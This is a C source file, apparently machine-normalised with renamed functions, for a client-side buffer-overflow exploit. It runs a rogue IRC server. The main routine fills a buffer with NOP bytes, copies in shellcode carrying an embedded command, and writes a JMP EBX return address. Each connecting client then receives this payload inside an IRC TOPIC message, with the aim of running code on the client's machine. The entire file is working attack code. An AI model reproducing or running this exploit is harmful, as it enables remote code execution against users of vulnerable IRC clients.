#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  serv_addr ;
typedef  int /*<<< orphan*/  cli_addr ;

/* Variables and functions */
 size_t BUFEND ; 
 size_t CMDLENP ; 
 char* COMMAND ; 
 scalar_t__ EINTR ; 
 char* FUNC ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 size_t JMPADR ; 
 char JMPOFS ; 
 char JMPS ; 
 int JMP_EBX_ADR ; 
 char* JOIN1 ; 
 char* JOIN2 ; 
 int /*<<< orphan*/  NOP ; 
 char* OPENING_MSG ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  PORT ; 
 int RETADR ; 
 int /*<<< orphan*/  SIGCHLD ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (int,struct sockaddr*,int*) ; 
 scalar_t__ FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 char* exploit_code ; 
 int FUNC5 () ; 
 int /*<<< orphan*/  handleSIGCHLD ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (int) ; 
 int FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 int FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (char*,char*,int) ; 

int FUNC19(int argc, char *argv[])
{
    int     serv_sock,cli_sock;
    int     pid,clilen,p,ip;
    char    buff[30000],jank[10000];
    struct  sockaddr_in serv_addr;
    struct  sockaddr_in cli_addr;
    
    FUNC12( SIGCHLD, handleSIGCHLD );

    FUNC9(jank,NOP,BUFEND);
    FUNC16(exploit_code,FUNC);
    FUNC16(exploit_code,COMMAND);
    exploit_code[CMDLENP]=FUNC17(COMMAND);
    FUNC18(jank+RETADR+4,exploit_code,FUNC17(exploit_code));

    ip=JMP_EBX_ADR;
    jank[JMPADR]  =JMPS;
    jank[JMPADR+1]=JMPOFS;
    jank[RETADR+3]=0xff&(ip>>24);
    jank[RETADR+2]=0xff&(ip>>16);
    jank[RETADR+1]=0xff&(ip>>8);
    jank[RETADR]  =ip&0xff;
    jank[BUFEND]  =0;

    if((serv_sock=FUNC14(PF_INET,SOCK_STREAM,0))<0){
        FUNC10("socket");
        FUNC4(1);
    }
    FUNC2(( char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family        = PF_INET;
    serv_addr.sin_addr.s_addr   = FUNC6(INADDR_ANY);
    serv_addr.sin_port          = FUNC7(PORT);
    if(FUNC1(serv_sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr))<0){
        FUNC10("bind");
        FUNC4(1);
    }
    FUNC8(serv_sock,5 );
    
    while(1){
        clilen   = sizeof(cli_addr);
        cli_sock = FUNC0(serv_sock,(struct sockaddr *)&cli_addr,&clilen);
        if( cli_sock<0){
            if(errno==EINTR) continue;
            FUNC10("accept" );
            FUNC4(1);
        }
        if((pid=FUNC5())<0){
            FUNC10( "fork" );
            FUNC4(1);
        }
        if(pid==0){
            FUNC3(serv_sock);
            FUNC11(cli_sock, OPENING_MSG, FUNC17(OPENING_MSG),0);
            FUNC11(cli_sock, JOIN1, FUNC17(JOIN1),0);
            FUNC11(cli_sock, "\n",1,0 );
            FUNC11(cli_sock, JOIN2, FUNC17(buff),0);
            FUNC15( buff, ":fucker!~fuck@127.0.0.1 TOPIC #fuck :%s\n", jank );
            FUNC11(cli_sock, buff, FUNC17(buff),0);
            FUNC13(1800);
            FUNC4(0);
        }else
            FUNC3(cli_sock);
    }
}